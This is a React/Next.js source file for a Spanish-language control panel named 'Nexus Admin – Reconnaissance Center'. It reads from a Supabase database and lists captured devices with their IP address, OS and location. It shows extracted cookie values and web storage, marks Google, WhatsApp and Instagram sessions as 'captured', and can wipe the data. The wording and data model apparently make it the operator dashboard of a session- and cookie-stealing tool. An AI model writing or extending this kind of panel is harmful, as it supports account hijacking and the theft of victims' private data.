"use client";

import React, { useState, useEffect } from 'react';
import { 
  Monitor, Laptop, Smartphone, Globe, ShieldCheck, ShieldAlert, 
  Database, Search, MapPin, Activity, Clock, Cpu, Cookie, Trash2 
} from 'lucide-react';
import { supabase, SessionSnapshot, Cookie as CookieType } from '@/lib/supabase';

export default function SessionDashboard() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<CookieType[]>([]);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [searchCookie, setSearchCookie] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchSessions();
  }, []);

  const fetchSessions = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('session_snapshots')
      .select('*')
      .order('captured_at', { ascending: false });
    
    if (!error && data) {
      setSessions(data);
      if (data.length > 0) {
        setSelectedSession(data[0]);
      }
    }
    setLoading(false);
  };

  useEffect(() => {
    if (selectedSession) {
      fetchSessionData(selectedSession.id);
    }
  }, [selectedSession]);

  const fetchSessionData = async (snapshotId: string) => {
    const [cookiesRes, storageRes] = await Promise.all([
      supabase.from('cookies').select('*').eq('snapshot_id', snapshotId),
      supabase.from('web_storage').select('*').eq('snapshot_id', snapshotId)
    ]);
    if (cookiesRes.data) setCookies(cookiesRes.data);
    if (storageRes.data) setWebStorage(storageRes.data);
  };

  const clearDatabase = async () => {
    if (!window.confirm('¿Estás seguro de que quieres eliminar todos los datos de la base de datos? Esta acción no se puede deshacer.')) {
      return;
    }
    
    try {
      setLoading(true);
      const { error } = await supabase
        .from('session_snapshots')
        .delete()
        .neq('id', '00000000-0000-0000-0000-000000000000');
      
      if (error) {
        alert('Error al limpiar la base de datos: ' + error.message);
      } else {
        alert('Base de datos limpiada correctamente.');
        setSessions([]);
        setSelectedSession(null);
        setCookies([]);
        setWebStorage([]);
      }
    } catch (err) {
      alert('Error: ' + err.message);
    } finally {
      setLoading(false);
    }
  };

  // Helpers
  const getDeviceIcon = (os?: string) => {
    if (!os) return <Monitor className="w-5 h-5" />;
    const lowerOs = os.toLowerCase();
    if (lowerOs.includes('mac') || lowerOs.includes('windows')) return <Laptop className="w-5 h-5" />;
    if (lowerOs.includes('android') || lowerOs.includes('ios')) return <Smartphone className="w-5 h-5" />;
    return <Monitor className="w-5 h-5" />;
  };

  const checkPlatformStatus = (domain: string) => {
    return cookies.some(c => c.domain.includes(domain)) || webStorage.some(s => s.domain.includes(domain));
  };

  const filteredCookies = cookies.filter(c => 
    c.name.toLowerCase().includes(searchCookie.toLowerCase()) || 
    c.domain.toLowerCase().includes(searchCookie.toLowerCase())
  );

  return (
    <div className="flex h-screen bg-[#0A0E17] text-gray-200 font-sans selection:bg-indigo-500/30">
      
      {/* SIDEBAR IZQUIERDO */}
      <aside className="w-80 bg-[#111827] border-r border-gray-800 flex flex-col z-20">
        <div className="p-6 border-b border-gray-800 flex justify-between items-center">
          <div>
            <h1 className="text-xl font-bold text-white flex items-center gap-3">
              <ShieldAlert className="w-6 h-6 text-indigo-500" />
              Nexus Admin
            </h1>
            <p className="text-xs text-gray-400 mt-1 uppercase tracking-widest font-semibold">
              Reconnaissance Center
            </p>
          </div>
          <button onClick={fetchSessions} className="p-2 hover:bg-gray-800 rounded-full transition-colors" title="Actualizar">
            <Activity className={`w-4 h-4 text-indigo-400 ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-2 scrollbar-thin scrollbar-thumb-gray-700">
          <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3 px-2">
            Dispositivos Capturados ({sessions.length})
          </h2>
          {sessions.map((session) => (
            <button
              key={session.id}
              onClick={() => setSelectedSession(session)}
              className={`w-full text-left p-3 rounded-xl transition-all duration-200 border ${
                selectedSession?.id === session.id
                  ? 'bg-indigo-500/10 border-indigo-500/50 shadow-[0_0_15px_rgba(99,102,241,0.1)]'
                  : 'bg-transparent border-transparent hover:bg-gray-800/50 hover:border-gray-700'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`p-2 rounded-lg ${selectedSession?.id === session.id ? 'bg-indigo-500/20 text-indigo-400' : 'bg-gray-800 text-gray-400'}`}>
                  {getDeviceIcon(session.os)}
                </div>
                <div className="flex-1 truncate">
                  <h3 className="font-medium text-sm text-gray-100 truncate">{session.pc_name || session.device_id || 'Unknown Device'}</h3>
                  <p className="text-xs text-gray-400 flex items-center gap-1 mt-0.5">
                    <MapPin className="w-3 h-3" />
                    {session.location_city || 'Desconocido'}, {session.location_country || 'Desconocido'}
                  </p>
                </div>
                {selectedSession?.id === session.id && (
                  <div className="w-2 h-2 rounded-full bg-indigo-500 animate-pulse" />
                )}
              </div>
            </button>
          ))}
          {sessions.length === 0 && !loading && (
            <p className="text-xs text-gray-500 px-2 py-4 text-center">No hay sesiones registradas.</p>
          )}
        </div>
        {/* BOTÓN LIMPIAR BASE DE DATOS */}
        <div className="p-4 border-t border-gray-800 bg-[#0E131F]">
          <button
            onClick={clearDatabase}
            className="w-full py-2.5 px-4 bg-red-950/30 hover:bg-red-900/40 text-red-400 hover:text-red-300 border border-red-900/30 hover:border-red-700/50 rounded-xl text-sm font-medium transition-all duration-200 flex items-center justify-center gap-2 shadow-[0_0_10px_rgba(239,68,68,0.05)]"
          >
            <Trash2 className="w-4 h-4" />
            Limpiar Base de Datos
          </button>
        </div>
      </aside>

      {/* MAIN VIEW */}
      <main className="flex-1 flex flex-col h-screen overflow-hidden relative">
        {/* Fondo decorativo (Glow) */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-3/4 h-64 bg-indigo-500/5 rounded-full blur-[120px] pointer-events-none" />

        {selectedSession ? (
          <div className="flex-1 overflow-y-auto p-8 z-10 scrollbar-thin scrollbar-thumb-gray-800">
            
            {/* Header de la sesión */}
            <div className="mb-8 flex justify-between items-end">
              <div>
                <h2 className="text-3xl font-bold text-white tracking-tight flex items-center gap-3">
                  {selectedSession.pc_name || selectedSession.device_id || 'Dispositivo'}
                  <span className="text-xs font-medium px-2.5 py-1 bg-green-500/10 text-green-400 rounded-full border border-green-500/20 flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-green-500"></span>
                    Online
                  </span>
                </h2>
                <p className="text-sm text-gray-400 mt-2 flex items-center gap-2">
                  <Clock className="w-4 h-4" />
                  Última captura: {new Date(selectedSession.captured_at).toLocaleString()}
                </p>
              </div>
            </div>

            {/* Top Cards Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
              
              {/* Tarjeta de Red & Sistema */}
              <div className="bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl p-6 shadow-xl">
                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-gray-800">
                  <Activity className="w-5 h-5 text-blue-400" />
                  <h3 className="font-semibold text-gray-200">Huella de Red & SO</h3>
                </div>
                <div className="space-y-4">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-500 text-sm">Dirección IP</span>
                    <span className="font-mono text-sm text-blue-400">{selectedSession.ip_address || 'N/A'}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-500 text-sm flex items-center gap-2"><Cpu className="w-4 h-4"/> OS</span>
                    <span className="text-sm text-gray-200">{selectedSession.os || 'N/A'}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-500 text-sm flex items-center gap-2"><Globe className="w-4 h-4"/> Ubicación</span>
                    <span className="text-sm text-gray-200">{selectedSession.location_city || 'N/A'}, {selectedSession.location_country || 'N/A'}</span>
                  </div>
                </div>
              </div>

              {/* Tarjeta de Plataformas Clave */}
              <div className="lg:col-span-2 bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl p-6 shadow-xl">
                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-gray-800">
                  <ShieldCheck className="w-5 h-5 text-emerald-400" />
                  <h3 className="font-semibold text-gray-200">Estado de Plataformas</h3>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  {[
                    { name: 'Google', domain: 'google.com', icon: 'G' },
                    { name: 'WhatsApp', domain: 'whatsapp.com', icon: 'W' },
                    { name: 'Instagram', domain: 'instagram.com', icon: 'I' }
                  ].map(platform => {
                    const isCaptured = checkPlatformStatus(platform.domain);
                    return (
                      <div key={platform.name} className="bg-gray-900/50 border border-gray-800/50 rounded-xl p-4 flex items-center gap-4">
                        <div className={`w-10 h-10 rounded-lg flex items-center justify-center font-bold text-lg ${
                          isCaptured ? 'bg-emerald-500/10 text-emerald-400' : 'bg-gray-800 text-gray-600'
                        }`}>
                          {platform.icon}
                        </div>
                        <div>
                          <p className="font-medium text-sm text-gray-200">{platform.name}</p>
                          <p className={`text-xs mt-0.5 ${isCaptured ? 'text-emerald-400' : 'text-gray-500'}`}>
                            {isCaptured ? '✓ Sesión Capturada' : 'No detectado'}
                          </p>
                        </div>
                      </div>
                    )
                  })}
                </div>
              </div>

            </div>

            {/* Sección de Datos Crudos (Cookies & Storage) */}
            <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
              
              {/* Tabla de Cookies */}
              <div className="bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl flex flex-col overflow-hidden h-[500px]">
                <div className="p-5 border-b border-gray-800 flex justify-between items-center bg-gray-900/30">
                  <h3 className="font-semibold text-gray-200 flex items-center gap-2">
                    <Cookie className="w-4 h-4 text-orange-400" />
                    Cookies Extraídas
                    <span className="text-xs bg-gray-800 px-2 py-0.5 rounded-full text-gray-400">{cookies.length}</span>
                  </h3>
                  <div className="relative">
                    <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
                    <input 
                      type="text" 
                      placeholder="Buscar por nombre o dominio..." 
                      value={searchCookie}
                      onChange={(e) => setSearchCookie(e.target.value)}
                      className="bg-gray-900 border border-gray-700 text-sm rounded-lg focus:ring-indigo-500 focus:border-indigo-500 block w-full pl-9 p-2 placeholder-gray-500"
                    />
                  </div>
                </div>
                <div className="flex-1 overflow-auto scrollbar-thin scrollbar-thumb-gray-700 p-0">
                  <table className="w-full text-sm text-left text-gray-400">
                    <thead className="text-xs text-gray-500 uppercase bg-gray-900/50 sticky top-0">
                      <tr>
                        <th className="px-6 py-3 font-medium">Dominio</th>
                        <th className="px-6 py-3 font-medium">Nombre</th>
                        <th className="px-6 py-3 font-medium">Valor</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredCookies.map((cookie) => (
                        <tr key={cookie.id} className="border-b border-gray-800/50 hover:bg-gray-800/30 transition-colors">
                          <td className="px-6 py-3 text-gray-300">{cookie.domain}</td>
                          <td className="px-6 py-3 font-mono text-indigo-300">{cookie.name}</td>
                          <td className="px-6 py-3 font-mono text-xs max-w-[150px] truncate" title={cookie.value}>
                            {cookie.value}
                          </td>
                        </tr>
                      ))}
                      {filteredCookies.length === 0 && (
                        <tr>
                          <td colSpan={3} className="px-6 py-8 text-center text-gray-500">
                            No se encontraron cookies.
                          </td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Visor Web Storage */}
              <div className="bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl flex flex-col overflow-hidden h-[500px]">
                <div className="p-5 border-b border-gray-800 bg-gray-900/30">
                  <h3 className="font-semibold text-gray-200 flex items-center gap-2">
                    <Database className="w-4 h-4 text-purple-400" />
                    Web Storage (Local / IndexedDB)
                    <span className="text-xs bg-gray-800 px-2 py-0.5 rounded-full text-gray-400">{webStorage.length}</span>
                  </h3>
                </div>
                <div className="flex-1 overflow-auto scrollbar-thin scrollbar-thumb-gray-700 p-5 space-y-4">
                  {webStorage.map((item) => (
                    <div key={item.id} className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
                      <div className="flex justify-between items-start mb-2">
                        <span className="text-xs font-semibold uppercase tracking-wider text-purple-400">{item.domain}</span>
                        <span className="text-xs font-mono bg-gray-800 px-2 py-1 rounded text-gray-300">{item.key}</span>
                      </div>
                      <div className="bg-black/50 p-3 rounded-lg border border-gray-800">
                        <pre className="text-xs font-mono text-gray-400 whitespace-pre-wrap break-all">
                          {item.value}
                        </pre>
                      </div>
                    </div>
                  ))}
                  {webStorage.length === 0 && (
                    <div className="h-full flex flex-col items-center justify-center text-gray-500 gap-3">
                      <Database className="w-10 h-10 opacity-20" />
                      <p>No hay datos de storage capturados</p>
                    </div>
                  )}
                </div>
              </div>

            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center text-gray-500 z-10">
            <ShieldAlert className="w-16 h-16 mb-4 opacity-20" />
            <p className="text-lg font-medium">Selecciona una sesión en el panel lateral</p>
            <p className="text-sm opacity-70">Para ver los datos detallados del dispositivo</p>
          </div>
        )}
      </main>
    </div>
  );
}
